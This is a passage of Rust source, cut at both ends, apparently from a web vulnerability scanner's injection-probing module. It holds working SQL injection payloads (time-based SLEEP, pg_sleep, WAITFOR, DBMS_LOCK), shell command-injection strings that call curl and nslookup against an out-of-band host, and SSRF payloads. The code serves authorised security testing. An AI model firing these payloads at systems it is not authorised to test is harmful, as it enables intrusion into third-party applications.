                &ep.url,
                oast,
                oob_reg.as_deref(),
                Some(&oob_queue),
                &xml_seen,
            ),
        )
        .await
        {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    // Personal data served to a caller who never authenticated. Only meaningful
    // when the scan itself holds no credentials, which is what
    // `unauthenticated` records.
    if want("exposure") && unauthenticated {
        let alts: Vec<(usize, Vec<String>)> = varying
            .get(&format!("{}{}", host_of(&ep.url), path_only(&ep.url)))
            .map(|m| m.iter().map(|(i, v)| (*i, v.clone())).collect())
            .unwrap_or_default();
        let declared = declared_path_indices(&ep);
        if let Some(f) = crate::probe::spent(
            "exposure",
            crate::exposure::probe(&client, &ep.method, &ep.url, &alts, &declared),
        )
        .await
        {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    for site in sites_for(&ep, &varying) {
        // Every oracle on this site compares against the baseline, so losing it
        // loses the site - silently, which is the problem. One timed-out
        // request was enough to drop a whole endpoint, and on a target being
        // hit by time-based probes on other workers that happens: PHP's worker
        // pool is finite and a few five-second sleeps exhaust it.
        //
        // Retry before giving up, and when it still fails, say which endpoint
        // was skipped instead of leaving a hole that reads as "nothing here".
        let mut baseline = None;
        for attempt in 0..3 {
            if attempt > 0 {
                tokio::time::sleep(Duration::from_millis(500 * attempt)).await;
            }
            if let Some(r) =
                crate::probe::spent("baseline", send_site(&client, &site, &site.base_value)).await
            {
                // The site's own value, no payload: this is what "normal" costs
                // here, and it is what the time-based oracles measure against.
                crate::probe::observe_latency(&site.url, r.elapsed_ms);
                baseline = Some(r);
                break;
            }
        }
        sites += 1;
        let Some(baseline) = baseline else {
            starved += 1;
            let n = skips.fetch_add(1, Ordering::Relaxed);
            if n < SKIPS_SPELLED_OUT {
                let _ = tx.send(json!({
                    "type": "log",
                    "message": format!(
                        "skipped {} {} ({}): the endpoint did not answer a baseline request after \
                         3 attempts, so no oracle could run against it",
                        site.method, site.url, site.where_label()
                    )
                }));
            }
            continue;
        };
        // One injection point can be more than one kind of sink: PHP's
        // include() takes a local path AND a URL, so the same parameter is both
        // LFI and SSRF, with different severities and different fixes. Every
        // class runs.
        //
        // A cap of four confirmed classes per point used to sit here, meant to
        // stop an endpoint that executes everything from burning requests. It
        // was a guess, and it reintroduced the exact bug it was written beside:
        // Mutillidae's `?page=` confirms SQLi, XSS, command injection and SSRF
        // before the LFI probe is reached, so the file read - the most severe of
        // the five - was cut off by the cap and looked like a detection failure.
        // Cost is already bounded by the concurrency limit and by each probe's
        // own request budget. Hiding findings is not an acceptable way to buy
        // time.
        // A target whose ordinary pages already take as long as the sleep we
        // would inject cannot be measured this way, and the time-based oracles
        // return nothing there. Nothing is not the same as "clean", so say it
        // once per host - a scanner that quietly stops testing a class produces
        // a report indistinguishable from one that tested it and found nothing.
        if let crate::probe::Timing::Hopeless { slow_normal_ms } =
            crate::probe::timing(&site.url, SLEEP_SECS, SLEEP_THRESHOLD_MS)
        {
            if seen_once(&xml_seen, format!("slowhost:{}", host_of(&site.url))) {
                let _ = tx.send(json!({
                    "type": "log",
                    "message": format!(
                        "time-based SQL and command-injection oracles are OFF for {}: its own \
                         unpayloaded responses run to {}ms, at or past the {}s sleep they inject, \
                         so a delay here could not be told from the application being busy. Their \
                         absence from the results is not evidence. Reflected, error-based and \
                         out-of-band detection for both classes is unaffected.",
                        host_of(&site.url),
                        slow_normal_ms,
                        SLEEP_SECS
                    )
                }));
            }
        }
        let mut hits = 0usize;
        let emit = |f: Value, hits: &mut usize| {
            if !seen_once(&found_seen, finding_identity(&f)) {
                return;
            }
            let _ = tx.send(json!({"type":"finding","data":f}));
            *hits += 1;
        };
        if want("sqli") {
            if let Some(f) =
                crate::probe::spent("sqli", probe_sqli(&client, &site, &baseline)).await
            {
                emit(f, &mut hits);
            }
        }
        if want("cmdi") {
            if let Some(f) = crate::probe::spent(
                "cmdi",
                probe_cmdi(&client, &site, oast, oob_reg.as_deref(), Some(&oob_queue)),
            )
            .await
            {
                emit(f, &mut hits);
            }
        }
        if want("ssrf") {
            if let Some(f) = crate::probe::spent(
                "ssrf",
                probe_ssrf(
                    &client,
                    client_nr.as_ref(),
                    &site,
                    oast,
                    oob_reg.as_deref(),
                    Some(&oob_queue),
                    &chain_targets,
                ),
            )
            .await
            {
                emit(f, &mut hits);
            }
        }
        if want("xss") {
            if let Some(f) = crate::probe::spent("xss", probe_xss(&client, &site)).await {
                emit(f, &mut hits);
            }
        }
        if want("lfi") {
            if let Some(f) = crate::probe::spent("lfi", probe_lfi(&client, &site, &baseline)).await
            {
                emit(f, &mut hits);
            }
        }
        if want("ssti") {
            if let Some(f) = crate::probe::spent("ssti", probe_ssti(&client, &site)).await {
                emit(f, &mut hits);
            }
        }
        if want("crlf") {
            if let Some(f) = crate::probe::spent("crlf", probe_crlf(&client, &site)).await {
                emit(f, &mut hits);
            }
        }
        // Named explicitly only. `want` treats an empty class list as
        // "everything", and this one must never be part of that: it changes the
        // target's state and cannot be undone from outside.
        if classes.iter().any(|c| c == "proto_pollution") {
            if let Some(f) = crate::probe::spent(
                "proto_pollution",
                probe_proto_pollution(&client, &site, &baseline),
            )
            .await
            {
                emit(f, &mut hits);
            }
        }
        if want("nosql") {
            if let Some(f) =
                crate::probe::spent("nosql", probe_nosql(&client, &site, &baseline)).await
            {
                emit(f, &mut hits);
            }
        }
        // Named explicitly only. Steps one to three are ordinary in-domain
        // requests, but the last one deliberately creates a valid-looking record
        // with an invalid value, and on a real application that can be a credit
        // rather than an error. That is a different kind of state change from a
        // SQL payload that errors out.
        if classes.iter().any(|c| c == "tampering") {
            if let Some(f) =
                crate::probe::spent("tampering", probe_tampering(&client, &site, &baseline)).await
            {
                emit(f, &mut hits);
            }
        }
        if want("deserialization") {
            if let Some(f) =
                crate::probe::spent("deserialization", probe_deserialization(&client, &site)).await
            {
                emit(f, &mut hits);
            }
        }
        if want("open_redirect") {
            if let Some(nr) = client_nr.as_ref() {
                if let Some(f) =
                    crate::probe::spent("open_redirect", probe_open_redirect(nr, &site)).await
                {
                    emit(f, &mut hits);
                }
            }
        }
        found += hits as i64;
    }
    EndpointOutcome {
        found,
        starved: sites > 0 && starved == sites,
    }
}

/// Expand an endpoint into its fuzzable sites (query params, path segments,
/// body fields). `varying` carries the positions the corpus proved variable.
fn sites_for(ep: &InjEndpoint, varying: &VaryingPaths) -> Vec<Site> {
    let method = ep.method.to_uppercase();
    let mut out = Vec::new();
    let qnames: Vec<String> = if ep.params.is_empty() {
        query_param_names(&ep.url)
    } else {
        ep.params.clone()
    };
    for name in qnames {
        let base = current_value(&ep.url, &name).unwrap_or_else(|| "1".to_string());
        out.push(Site {
            method: method.clone(),
            url: ep.url.clone(),
            loc: Loc::Query,
            param: name,
            base_value: base,
            body: Vec::new(),
            path_idx: 0,
        });
    }
    // Path segments carrying a value rather than route text. REST APIs put the
    // object key in the path (/users/{id}, /orgs/{slug}), so this reaches
    // injection that query and body fuzzing structurally cannot.
    //
    // Three sources of truth, strongest first:
    //   1. the endpoint declares them (OpenAPI `{id}`, or the asset graph's
    //      recorded request shape)
    //   2. the corpus shows the position varying between otherwise identical
    //      paths, which catches `/users/alice` where no heuristic would
    //   3. the segment merely looks like an identifier
    //
    // The third is a guess and is used only when the first two say nothing,
    // because a guess that fires on every wordy segment costs requests and
    // credibility on real targets.
    let path = path_only(&ep.url);
    let declared = declared_path_indices(ep);
    let observed: Vec<usize> = varying
        .get(&format!("{}{}", host_of(&ep.url), path))
        .map(|m| m.keys().copied().collect())
        .unwrap_or_default();
    let have_evidence = !declared.is_empty() || !observed.is_empty();
    for (i, seg) in path.split('/').enumerate() {
        if seg.is_empty() {
            continue;
        }
        let is_param = declared.contains(&i)
            || observed.contains(&i)
            || (!have_evidence && looks_like_id_seg(seg));
        if is_param {
            out.push(Site {
                method: method.clone(),
                url: ep.url.clone(),
                loc: Loc::Path,
                param: seg.to_string(),
                base_value: seg.to_string(),
                body: Vec::new(),
                path_idx: i,
            });
        }
    }
    if !ep.body.is_empty() {
        let loc = if ep.body_type.eq_ignore_ascii_case("json") {
            Loc::BodyJson
        } else {
            Loc::BodyForm
        };
        let body: Vec<(String, String, Option<String>)> = ep
            .body
            .iter()
            .map(|f| {
                let base = if f.value.is_empty() {
                    typed_default(f.ty.as_deref()).to_string()
                } else {
                    f.value.clone()
                };
                (f.name.clone(), base, f.ty.clone())
            })
            .collect();
        let bmethod = if method == "GET" {
            "POST".to_string()
        } else {
            method.clone()
        };
        for f in &ep.body {
            let base = body
                .iter()
                .find(|(k, _, _)| k == &f.name)
                .map(|(_, v, _)| v.clone())
                .unwrap_or_default();
            out.push(Site {
                method: bmethod.clone(),
                url: ep.url.clone(),
                loc,
                param: f.name.clone(),
                base_value: base,
                body: body.clone(),
                path_idx: 0,
            });
        }
    }
    // Request-header sites. These carry user-controlled values that back-ends routinely log or query
    // (X-Forwarded-For into an access-log INSERT, User-Agent into analytics), so they are a real SQLi /
    // injection surface that query+body fuzzing never touches. A benign baseline keeps the request
    // valid; the probes append their payloads to it. Kept to the few high-yield headers to bound cost.
    for (hname, hbase) in [
        ("X-Forwarded-For", "127.0.0.1"),
        ("User-Agent", "Mozilla/5.0"),
        ("Referer", "https://www.google.com/"),
    ] {
        out.push(Site {
            method: method.clone(),
            url: ep.url.clone(),
            loc: Loc::Header,
            param: hname.to_string(),
            base_value: hbase.to_string(),
            body: Vec::new(),
            path_idx: 0,
        });
    }

    out.truncate(MAX_SITES_PER_EP);
    out
}

/// Segment indices this endpoint declares as parameters.
fn declared_path_indices(ep: &InjEndpoint) -> Vec<usize> {
    if ep.path_params.is_empty() {
        return Vec::new();
    }
    let path = path_only(&ep.url);
    let segs: Vec<&str> = path.split('/').collect();
    let mut out = Vec::new();
    for spec in &ep.path_params {
        match spec {
            Value::Number(n) => {
                if let Some(i) = n.as_u64() {
                    if (i as usize) < segs.len() {
                        out.push(i as usize);
                    }
                }
            }
            Value::String(sv) => {
                let want = sv.trim_matches(|c| c == '{' || c == '}');
                if let Some(i) = segs.iter().position(|s| {
                    *s == sv.as_str()
                        || *s == want
                        || s.trim_matches(|c| c == '{' || c == '}') == want
                }) {
                    out.push(i);
                }
            }
            _ => {}
        }
    }
    out.sort_unstable();
    out.dedup();
    out
}

/// Path positions that demonstrably vary across the endpoint corpus.
///
/// Two requests that agree on every segment except position `i` are proof that
/// position `i` carries a value rather than route text: `/users/alice` beside
/// `/users/bob` says segment 1 is a parameter, and says it about a segment no
/// shape heuristic would ever accept, because "alice" looks exactly like a
/// static route.
///
/// This is the difference between guessing what an identifier looks like and
/// observing what actually moves. It only ever adds sites, and it says nothing
/// about positions it has not seen vary, so a corpus of one endpoint falls
/// through to the shape heuristic unchanged.
type VaryingPaths = HashMap<String, HashMap<usize, Vec<String>>>;

/// Positions the corpus proves variable, and the values seen at each. The
/// values matter as much as the positions: two different identifiers at the
/// same position are two different objects, which is what the public-exposure
/// oracle compares.
fn varying_path_indices(endpoints: &[InjEndpoint]) -> VaryingPaths {
    // key: host + segment count + the segments with position i blanked.
    let mut buckets: HashMap<(String, usize, usize, String), HashSet<String>> = HashMap::new();
    for ep in endpoints {
        let host = host_of(&ep.url);
        let path = path_only(&ep.url);
        let segs: Vec<&str> = path.split('/').collect();
        for i in 0..segs.len() {
            if segs[i].is_empty() {
                continue;
            }
            let mut masked = segs.clone();
            masked[i] = "\u{0}";
            let key = (host.clone(), segs.len(), i, masked.join("/"));
            buckets.entry(key).or_default().insert(segs[i].to_string());
        }
    }
    let mut varying: VaryingPaths = HashMap::new();
    for ((host, _len, i, masked), values) in buckets {
        if values.len() < 2 {
            continue; // one observation is not evidence of anything
        }
        let mut all: Vec<String> = values.iter().cloned().collect();
        all.sort();
        for v in &values {
            let concrete = masked.replace('\u{0}', v);
            varying
                .entry(format!("{host}{concrete}"))
                .or_default()
                .insert(i, all.clone());
        }
    }
    varying
}

fn host_of(url: &str) -> String {
    let after = url.split("://").nth(1).unwrap_or(url);
    after.split('/').next().unwrap_or("").to_string()
}

fn looks_like_id_seg(seg: &str) -> bool {
    if seg.is_empty() {
        return false;
    }
    if seg.chars().all(|c| c.is_ascii_digit()) {
        return true; // numeric id
    }
    let dashes = seg.matches('-').count();
    if seg.len() >= 32 || (dashes >= 4 && seg.len() >= 30) {
        return true; // uuid / long token
    }
    seg.len() >= 4
        && seg.chars().any(|c| c.is_ascii_digit())
        && seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

fn path_only(url: &str) -> String {
    let after = url.split("://").nth(1).unwrap_or(url);
    let start = after.find('/').unwrap_or(after.len());
    after[start..]
        .split(['?', '#'])
        .next()
        .unwrap_or("")
        .to_string()
}

/// Rebuild `url` with path segment `idx` replaced by the percent-encoded `value`.
fn set_path_seg(url: &str, idx: usize, value: &str) -> String {
    let (scheme, rest) = match url.split_once("://") {
        Some((s, r)) => (format!("{s}://"), r),
        None => (String::new(), url),
    };
    let (authority, tail) = match rest.find('/') {
        Some(p) => (&rest[..p], &rest[p..]),
        None => (rest, ""),
    };
    let (path, suffix) = match tail.find(['?', '#']) {
        Some(p) => (&tail[..p], &tail[p..]),
        None => (tail, ""),
    };
    let mut segs: Vec<String> = path.split('/').map(|s| s.to_string()).collect();
    if idx < segs.len() {
        segs[idx] = pct_encode(value);
    }
    format!("{scheme}{authority}{}{suffix}", segs.join("/"))
}

async fn send_site(client: &Client, site: &Site, value: &str) -> Option<Resp> {
    let (url, body) = site.render(value);
    let headers = site.header_override(value);
    send_with(
        client,
        &site.method,
        &url,
        body.as_ref().map(|(b, c)| (b.as_str(), *c)),
        &headers,
    )
    .await
}

// ---------------------------------------------------------------- SQLi
async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    // 1) error-based: an unbalanced quote yields a DB error the baseline lacks; a
    //    balanced-quote control must NOT error (else the app just always errors).
    let base = &site.base_value;
    if !is_sql_error(&baseline.body) {
        for q in ["'", "\""] {
            let broken = send_site(client, site, &format!("{base}{q}")).await;
            if let Some(r) = &broken {
                if is_sql_error(&r.body) {
                    let ctrl = send_site(client, site, &format!("{base}{q}{q}")).await;
                    let ctrl_clean = ctrl.map(|c| !is_sql_error(&c.body)).unwrap_or(false);
                    let again = send_site(client, site, &format!("{base}{q}")).await;
                    if ctrl_clean && again.map(|a| is_sql_error(&a.body)).unwrap_or(false) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (error-based)",
                            "high",
                            site,
                            format!(
                                "Injecting a single unbalanced quote into the {} produced a database error, and a balanced quote did not -- the value reaches a SQL statement unparameterised.",
                                site.where_label()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 2) syntax-break differential: a lone quote/paren that breaks the SQL makes the app ERROR (5xx or
    //    a stack-trace page), while a BALANCED control (doubled quote, or the same quote commented out)
    //    does NOT. This catches the common case where the DB error is swallowed into a generic 500 /
    //    custom error page, so `is_sql_error` never matches (e.g. an ASP.NET NullReference after the
    //    query fails). Requiring the comment/doubled-quote to RECOVER separates SQLi from a back-end
    //    that just 500s on any weird input (generic validation would reject the recovery form too).
    if !is_server_error(baseline.status, &baseline.body) {
        for (brk, comment) in [("'", "'-- -"), ("\"", "\"-- -"), (")", ")-- -")] {
            let broken = send_site(client, site, &format!("{base}{brk}")).await;
            let broke = broken
                .as_ref()
                .map(|r| is_server_error(r.status, &r.body))
                .unwrap_or(false);
            if !broke {
                continue;
            }
            // Two independent recovery forms: doubled delimiter, and comment-out. Both must come back
            // clean, and the break must reproduce, before we call it.
            let doubled = format!("{base}{brk}{brk}");
            let r_double = send_site(client, site, &doubled).await;
            let r_comment = send_site(client, site, &format!("{base}{comment}")).await;
            let again = send_site(client, site, &format!("{base}{brk}")).await;
            let clean = |r: &Option<Resp>| {
                r.as_ref()
                    .map(|x| !is_server_error(x.status, &x.body))
                    .unwrap_or(false)
            };
            let repro = again
                .as_ref()
                .map(|x| is_server_error(x.status, &x.body))
                .unwrap_or(false);
            // The doubled delimiter is the mandatory recovery; the
            // comment-out is corroboration when it agrees.
            //
            // Doubling the quote is the minimal repair that PRESERVES the
            // query's meaning: it stays inside the string literal, so the same
            // rows match and the app takes the same code path. Commenting the
            // rest out CHANGES the meaning - it can turn a query that matched
            // nothing into one that matches a row, after which the app acts on
            // that row and may fail there for reasons that are not SQL at all.
            // RailsGoat does exactly this: the commented form finds user 1 and
            // then errors inside save!, while the doubled form matches no row
            // and returns cleanly.
            //
            // Requiring both therefore loses real injections in any app that
            // hides DB errors and does work after the query, which is most
            // production software. Requiring the doubled form keeps the
            // precision control that matters: a backend that merely errors on
            // odd input would error on the doubled form too, since that also
            // carries a delimiter.
            if clean(&r_double) && repro {
                return Some(finding(
                    "sqli",
                    "SQL injection (error-based, differential)",
                    "high",
                    site,
                    format!(
                        "An unbalanced `{brk}` in the {} triggered a server error while the balanced form returned normally{} -- the value breaks and re-balances a SQL statement, so it is injected unparameterised (the DB error is masked behind a generic error page).",
                        site.where_label(),
                        if clean(&r_comment) {
                            ", as did the commented-out form"
                        } else {
                            " (the commented-out form did not, which is what happens when commenting the rest out makes the query match a row the app then acts on)"
                        }
                    ),
                ));
            }
        }
    }
    // 3) boolean-based
    // AND-pairs FIRST: they are the reliable test when the base value is a VALID identifier that
    // already returns a row (e.g. ?RecNo=16530062). There, an OR-tautology changes nothing the app
    // shows (the row still matches), so OR-pairs don't differentiate - but `AND 1=2` drops the row and
    // `AND 1=1` keeps it, a strong true/false split. Numeric context (no quote) with and without a
    // trailing comment, then the quoted string form. OR-pairs stay for params whose base value
    // normally returns NOTHING (search boxes, login fields), where the tautology is what reveals it.
    // The `/**/`-comment pair is a WAF-evasion variant of the numeric AND-pair: inline comments for
    // whitespace slip past filters that block ` AND `/`OR ` with spaces.
    let pairs = [
        (" AND 1=1", " AND 1=2"),
        (" AND 1=1-- -", " AND 1=2-- -"),
        ("/**/AND/**/1=1", "/**/AND/**/1=2"),
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        (" OR 1=1-- -", " OR 1=2-- -"),
    ];
    // Noise floor: sample the base once more and require the true/false split to clear its jitter, so
    // a page that just wobbles run-to-run (CSRF token, timestamp, ad slot) is not misread as an oracle.
    let jitter = send_site(client, site, base)
        .await
        .map(|r| (r.body.len() as i64 - baseline.body.len() as i64).abs())
        .unwrap_or(0);
    let min_diff = (jitter * 3).max(24);
    for (t, f) in pairs {
        let rt = send_site(client, site, &format!("{base}{t}")).await;
        let rf = send_site(client, site, &format!("{base}{f}")).await;
        if let (Some(a), Some(b)) = (rt, rf) {
            if boolean_differential(baseline, &a, &b, min_diff) {
                let rt2 = send_site(client, site, &format!("{base}{t}")).await;
                let rf2 = send_site(client, site, &format!("{base}{f}")).await;
                if let (Some(a2), Some(b2)) = (rt2, rf2) {
                    if boolean_differential(baseline, &a2, &b2, min_diff) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (boolean-based blind)",
                            "high",
                            site,
                            format!(
                                "A tautology and a contradiction injected into the {} produced consistently different result sets (true={} bytes, false={} bytes), indicating the value is evaluated inside a SQL query.",
                                site.where_label(),
                                a2.body.len(),
                                b2.body.len()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 3) time-based blind. Cover the four major engines' delay primitives, not just MySQL/Postgres:
    // an ASP.NET / .aspx back-end is almost always MSSQL, which has neither SLEEP() nor pg_sleep() -
    // it needs `WAITFOR DELAY` (as a stacked statement), and Oracle needs DBMS_LOCK.SLEEP. Without
    // these, a blind SQLi on a SQL Server target is completely invisible to timing.
    let payloads = [
        // MySQL / MariaDB
        format!("' AND SLEEP({SLEEP_SECS})-- -"),
        format!("\" AND SLEEP({SLEEP_SECS})-- -"),
        format!("' AND SLEEP({SLEEP_SECS})#"),
        format!(" AND SLEEP({SLEEP_SECS})"),
        // PostgreSQL
        format!("');SELECT pg_sleep({SLEEP_SECS})-- -"),
        format!(" AND {SLEEP_SECS}=(SELECT {SLEEP_SECS} FROM PG_SLEEP({SLEEP_SECS}))"),
        // MSSQL (SQL Server) - stacked WAITFOR DELAY, numeric and both quote contexts
        format!(";WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        format!("';WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        format!("\";WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        // Oracle
        format!("' AND DBMS_LOCK.SLEEP({SLEEP_SECS})-- -"),
    ];
    // As in `probe_cmdi`: the bar comes from this host's own responses.
    let bar = match crate::probe::timing(&site.url, SLEEP_SECS, SLEEP_THRESHOLD_MS) {
        crate::probe::Timing::Above(ms) => ms,
        crate::probe::Timing::Hopeless { .. } => return None,
    };
    for p in payloads {
        let r = send_site(client, site, &format!("{base}{p}")).await;
        if r.as_ref().map(|x| x.elapsed_ms >= bar).unwrap_or(false) {
            // Neutralise the delay for the control run: SLEEP(5)->SLEEP(0) (also covers
            // DBMS_LOCK.SLEEP), pg_sleep, PG_SLEEP, and WAITFOR's '0:0:5'->'0:0:0'.
            let zero = p
                .replace(&format!("SLEEP({SLEEP_SECS})"), "SLEEP(0)")
                .replace(&format!("pg_sleep({SLEEP_SECS})"), "pg_sleep(0)")
                .replace(&format!("PG_SLEEP({SLEEP_SECS})"), "PG_SLEEP(0)")
                .replace(&format!("0:0:{SLEEP_SECS}"), "0:0:0");
            let rc = send_site(client, site, &format!("{base}{zero}")).await;
            let again = send_site(client, site, &format!("{base}{p}")).await;
            let ctrl_fast = rc.map(|x| x.elapsed_ms < bar).unwrap_or(false);
            let repro = again.map(|x| x.elapsed_ms >= bar).unwrap_or(false);
            if ctrl_fast && repro {
                return Some(finding(
                    "sqli",
                    "SQL injection (time-based blind)",
                    "high",
                    site,
                    format!(
                        "A `SLEEP({SLEEP_SECS})` injected into the {} delayed the response past {}ms - a bar set from this host's own slow-normal response time, not a constant - while a `SLEEP(0)` control returned promptly and the delay reproduced.",
                        site.where_label(),
                        bar
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- OS command injection
async fn probe_cmdi(
    client: &Client,
    site: &Site,
    oast: Option<&crate::oast::OastClient>,
    oob_reg: Option<&crate::oast::OastReg>,
    oob_queue: Option<&OobQueue>,
) -> Option<Value> {
    let base = &site.base_value;

    // Fast, zero-FP oracle for the common reflected case: when the target echoes command output,
    // a shell-EVALUATED arithmetic marker shows up computed in the response, while the literal
    // payload (which carries the un-evaluated `$((a*b))`) never contains the product. So a match is
    // proof a shell ran the command - one request per separator, no sleeps, no OAST budget spent.
    // Tried first because it is both the cheapest and the most reliable signal when output reflects.
    {
        let prod = CMDI_ECHO_A * CMDI_ECHO_B; // computed here; the target's shell must reproduce it
        let marker = format!("zZcx{prod}xcZz");
        for sep in [";", "|", "&&", "$(", "`"] {
            let close = match sep {
                "$(" => ")",
                "`" => "`",
                _ => "",
            };
            let pl = format!("{base}{sep}echo zZcx$(({CMDI_ECHO_A}*{CMDI_ECHO_B}))xcZz{close}");
            if let Some(r) = send_site(client, site, &pl).await {
                if r.body.contains(&marker) {
                    return Some(finding(
                        "cmdi",
                        "OS command injection (output reflected)",
                        "critical",
                        site,
                        format!(
                            "A shell-evaluated arithmetic marker injected into the {} (separator `{sep}`) came back computed in the response, while the literal payload only ever carries the un-evaluated expression -- the value is executed by a shell.",
                            site.where_label()
                        ),
                    ));
                }
            }
        }
    }

    // Blind, out-of-band. Fire and park: the callback is checked once at the end
    // of the pass rather than waited on here. See `PendingOob`.
    if let (Some(oc), Some(reg), Some(q)) = (oast, oob_reg, oob_queue) {
        let (host, marker) = oc.host_marked(reg);
        for sep in [";", "|", "&&", "$(", "`"] {
            let close = if sep == "$(" {
                ")"
            } else if sep == "`" {
                "`"
            } else {
                ""
            };
            let _ = send_site(
                client,
                site,
                &format!("{base}{sep}curl http://{host}/c{close}"),
            )
            .await;
            let _ = send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
        }
        if let Ok(mut v) = q.lock() {
            v.push(PendingOob {
                marker,
                finding: finding(
                    "cmdi",
                    "OS command injection (blind, OAST-confirmed)",
                    "critical",
                    site,
                    format!(
                        "A shell metacharacter + `curl`/`nslookup` injected into the {} produced an out-of-band callback -- the value is executed by a shell.",
                        site.where_label()
                    ),
                ),
            });
        }
    }
    // What counts as a delay HERE, decided from what this host is doing now
    // rather than from a constant. See `probe::timing`.
    let bar = match crate::probe::timing(&site.url, SLEEP_SECS, SLEEP_THRESHOLD_MS) {
        crate::probe::Timing::Above(ms) => ms,
        crate::probe::Timing::Hopeless { .. } => return None,
    };
    for sep in [";", "|", "&&", "$(", "`"] {
        let close = if sep == "$(" {
            ")"
        } else if sep == "`" {
            "`"
        } else {
            ""
        };
        let pl = format!("{base}{sep}sleep {SLEEP_SECS}{close}");
        let r = send_site(client, site, &pl).await;
        if r.as_ref().map(|x| x.elapsed_ms >= bar).unwrap_or(false) {
            let ctrl = send_site(client, site, &format!("{base}{sep}sleep 0{close}")).await;
            let again = send_site(client, site, &pl).await;
            let ctrl_fast = ctrl.as_ref().map(|x| x.elapsed_ms < bar).unwrap_or(false);
            let repro = again.as_ref().map(|x| x.elapsed_ms >= bar).unwrap_or(false);

            // The delay has to TRACK the number we asked for, not merely exist.
            //
            // A threshold plus a control is not enough on a target that is
            // already slow: the payload request, the control and the retry are
            // three different moments, and a target under load answers some
            // quickly and some slowly whatever we send. Measured against
            // Mutillidae during a concurrent pass, that produced eight
            // command-injection findings on parameters with no shell behind
            // them at all - `do=logout` among them, which answers in 8ms when
            // asked on its own.
            //
            // Doubling the sleep is the discriminator. A real shell takes
            // roughly twice as long; a slow application has no reason to.
            let scales = if repro {
                let long = format!("{base}{sep}sleep {}{close}", SLEEP_SECS * 2);
                let base_ms = again.as_ref().map(|x| x.elapsed_ms).unwrap_or(0);
                match send_site(client, site, &long).await {
                    // Allow for jitter and for the app's own cost, which is
                    // present in both measurements: require most of the extra
                    // sleep to show up.
                    Some(x) => x.elapsed_ms >= base_ms + (SLEEP_SECS as u128 * 1000 * 6 / 10),
                    None => false,
                }
            } else {
                false
            };
            if ctrl_fast && repro && scales {
                return Some(finding(
                    "cmdi",
                    "OS command injection (time-based blind)",
                    "critical",
                    site,
                    format!(
                        "A shell `sleep {SLEEP_SECS}` injected into the {} (separator `{sep}`) delayed the response past {}ms - a bar set from this host's own slow-normal response time, not a constant - while `sleep 0` returned promptly, the delay reproduced, and doubling the sleep to {}s roughly doubled the delay. The response time tracks the number we asked for, which a merely slow application does not do.",
                        site.where_label(),
                        bar,
                        SLEEP_SECS * 2
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- SSRF (API7, OAST-confirmed)
/// Param names that commonly carry a URL/host the server then fetches. SSRF is only meaningful on
/// these (or on a value that already looks like a URL); firing on every string param would burn OAST
/// registrations and add noise for no signal.
/// Does this parameter name match one of a class's hint words?
///
/// Substring for a real word, exact for a short one. `REDIRECT_HINT` carries
/// "u", "r" and "to", and matched by substring those make `username`,
/// `password` and `author` redirect parameters - which is to say the gate was
/// letting nearly every parameter on every target through, and the class was
/// paying four requests a site for it. A one- or two-letter parameter really is
/// sometimes a redirect target, so the words stay; only the matching narrows.
fn hint_matches(name: &str, hints: &[&str]) -> bool {
    hints.iter().any(|h| {
        if h.len() <= 2 {
            name == *h
        } else {
            name.contains(h)
        }
    })
}

static SSRF_HINT: &[&str] = &[
    "url",
    "uri",
    "link",
    "src",
    "source",
    "dest",
    "destination",
    "target",
    "callback",
    "webhook",
    "hook",
    "feed",
    "rss",
    "image",
    "img",
    "avatar",
    "photo",
    "proxy",
    "fetch",
    "load",
    "domain",
    "host",
    "site",
    "page",
    "redirect",
    "next",
    "returnurl",
    "continue",
    "reference",
    "endpoint",
    "upstream",
    "remote",
    "download",
];

fn looks_like_url(v: &str) -> bool {
    v.starts_with("http://")
        || v.starts_with("https://")
        || v.starts_with("//")
        || v.contains("://")
}

/// Blind SSRF: supply a URL pointing at our OAST listener in a URL-bearing param; if the server
/// fetches it we get an out-of-band callback. OAST-confirmed = no false positives. Reuses the same
/// managed/BYO OAST client the cmdi probe uses.
#[allow(clippy::too_many_arguments)]
async fn probe_ssrf(
    client: &Client,
    client_nr: Option<&Client>,
    site: &Site,
    oast: Option<&crate::oast::OastClient>,
    oob_reg: Option<&crate::oast::OastReg>,
    oob_queue: Option<&OobQueue>,
    // Already filtered to what the operator authorised; see the driver.
    chain_targets: &[crate::chain::InternalTarget],
) -> Option<Value> {
    let name = site.param.to_lowercase();
    let hinted = hint_matches(&name, SSRF_HINT);
    if !hinted && !looks_like_url(&site.base_value) {
        return None;
    }
    // The version that reads back comes FIRST, and needs no listener.
    //
    // It used to sit after the OAST gate, which made it unreachable in exactly
    // the deployments it exists for: an engine with no out-of-band endpoint, or
    // a target with no route to the internet. An SSRF confined to internal
    // addresses produces no callback by definition, so gating the internal
    // check on the external one meant the dangerous case could only be found
    // when the harmless one already had been.
    if let Some(f) = probe_ssrf_reflected(client_nr.unwrap_or(client), site, chain_targets).await {
        return Some(f);
    }
    let oc = oast?;
    let reg = oob_reg?;
    let q = oob_queue?;
    let (host, marker) = oc.host_marked(reg);
    // Send the payloads with a client that does NOT follow redirects.
    //
    // An open redirect answers 302 to wherever you point it, and a
    // redirect-following client then fetches our own listener - so the callback
    // arrives, and "the server fetched it" is false: WE fetched it. That is not
    // hypothetical; it reported SSRF on Crawlground's `/api/redirect`, which
    // only ever sets a Location header. Refusing to follow makes the callback
    // mean what the finding says it means.
    let sender = client_nr.unwrap_or(client);
    let mut redirected_to_listener = false;
    for payload in [
        format!("http://{host}/"),
        format!("https://{host}/"),
        format!("http://{host}/{}", site.param),
    ] {
        if let Some(r) = send_site(sender, site, &payload).await {
